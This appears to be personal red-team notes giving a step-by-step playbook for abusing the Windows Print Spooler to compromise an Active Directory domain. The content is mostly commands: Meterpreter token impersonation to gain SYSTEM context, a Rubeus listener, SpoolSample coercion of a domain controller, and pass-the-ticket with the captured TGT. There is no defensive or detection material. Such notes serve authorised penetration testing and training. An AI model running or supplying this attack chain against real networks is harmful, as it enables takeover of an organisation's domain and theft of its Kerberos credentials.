## Abusing Print Spooler

To validate the presence of the MS-RPRN (Print System Remote Protocol) RPC pipe:

```powershell
dir \\<DC server name>\pipe\spoolss
```

Nb. It may only be possible to get a response from the named pipe when you have already impersonated the "NT AUTHORITY\\SYSTEM" user.

If you can get this response from attempting to query the named pipe then this is potentially a suitable context from which to run `Rubeus.exe` to capture coerced tickets.

### Abusing Print Spooler for local PrivEsc

Writeup pending

### Abusing Print Spooler for full domain pwnage

If you do not immediately get desirable output from probing the named pipe dir, try impersonating the SYSTEM user. From a Meterpreter console running with Administrator privilege:
```
load incognito
```
Verify a SYSTEM token that can be impersonated is available:
```
list_tokens -u
```
Impersonate the SYSTEM users token:
```
impersonate_token "NT AUTHORITY\\SYSTEM"
```
Get the running processes:
```
ps
```
Migrate into an appropriate process running as the SYSTEM user (nb. unsure if this is necessary in _addition_ to impersonating the SYSTEM token but eh doesn't take long to do both):
```
migrate 123
```
Verify we have the SYSTEM users context:
```
getuid
```
Test our access to the named pipe once more to see if our attack may work:
```powershell
dir \\<DC server name>\pipe\spoolss
```

From the same machine, get `Rubeus.exe` up and running. It's function at this stage is to sit and listen for incoming TGTs from the machine account of the target DC:
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC03$
```

Once `Rubeus.exe` is up and running we're ready to coerce the DC, the positional arguments to `SpoolSample.exe` are the target server, ie. the DC, and the capture server, ie. the one we're running `Rubeus.exe` on, in that order:
```powershell
.\SpoolSample.exe DC03 WEB05
```

If the attack succeeds a base64 encoded TGT will arrive in the session we have `Rubeus.exe` running in. No time to waste! The TGT is good to be passed by `Rubeus.exe`:
```powershell
.\Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
```
